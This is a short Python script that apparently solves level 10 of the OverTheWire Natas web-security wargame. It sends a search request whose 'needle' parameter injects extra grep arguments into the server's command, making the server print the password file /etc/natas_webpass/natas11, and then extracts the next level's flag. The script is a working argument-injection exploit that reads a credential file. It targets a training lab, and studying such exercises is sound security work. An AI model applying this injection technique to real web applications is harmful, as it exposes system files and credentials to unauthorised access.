import re
from requests import request as req

res = req(
  method="GET",
  url="http://natas10.natas.labs.overthewire.org/?needle=-E '.' /etc/natas_webpass/natas11&submit=Search",
  auth=("natas10", "t7...Ou")
)

match = re.search("/etc/natas_webpass/natas11:.*",res.text)

print(match.group().split(":")[1] if match else "NO FLAG")